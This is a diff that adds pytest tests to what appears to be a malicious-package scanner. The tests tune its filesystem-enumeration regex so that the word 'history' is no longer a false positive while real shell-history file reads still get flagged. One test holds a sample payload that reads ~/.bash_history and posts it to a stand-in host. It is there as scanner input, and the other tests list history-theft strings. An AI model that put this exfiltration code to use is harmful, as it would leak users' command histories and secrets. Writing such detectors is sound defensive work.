@@ -325,6 +325,44 @@ def test_proc_self_status_pattern_is_live():
     assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")
 
 
+def test_fs_enum_does_not_flag_the_word_history():
+    # `\bhistory\b.*\bread\b` under re.DOTALL spanned the whole file, so any module mentioning
+    # "history" before "read" was filesystem enumeration -- and a CRITICAL alongside a network
+    # call. That is how httpx, urllib3, IPython and torch got baselined.
+    for s in (
+        "history: list[Response] | None = None\n\ndef read(self): pass\n",
+        "from IPython.core.history import HistoryManager\n\ndef read(): pass\n",
+        "if retries is not None and retries.history:\n    resp.read()\n",
+        'if "history" in b:\n    b.read()\n',
+    ):
+        assert not sp.RE_FS_ENUM.search(s), s
+
+
+def test_fs_enum_still_flags_real_history_file_reads():
+    # The half that matters must fire. The old `\b\.bash_history\b` / `\b\.zsh_history\b` could
+    # never match ("~/.bash_history" puts \b between two non-word chars, the same unsatisfiable-\b
+    # bug as /proc/self/status above), so every form below was missed.
+    for s in (
+        'open(os.path.expanduser("~/.bash_history")).read()',
+        "p = Path.home() / '.zsh_history'",
+        'f = open("/root/.python_history")',
+        "open(os.path.expanduser('~/.history'))",
+        'hist = os.environ.get("HISTFILE")',
+    ):
+        assert sp.RE_FS_ENUM.search(s), s
+
+
+def test_history_theft_plus_network_is_critical():
+    payload = (
+        "import requests\n"
+        "data = open(os.path.expanduser('~/.bash_history')).read()\n"
+        "requests.post('http://x.invalid', data = data)\n"
+    )
+    findings = sp.check_py_file(payload, "pkg/_x.py", "pkg")
+    fs = [f for f in findings if "Enumerates filesystem" in f.check]
+    assert fs and fs[0].severity == sp.CRITICAL, findings
+
+
 def _mk(
     sev,
     pkg,
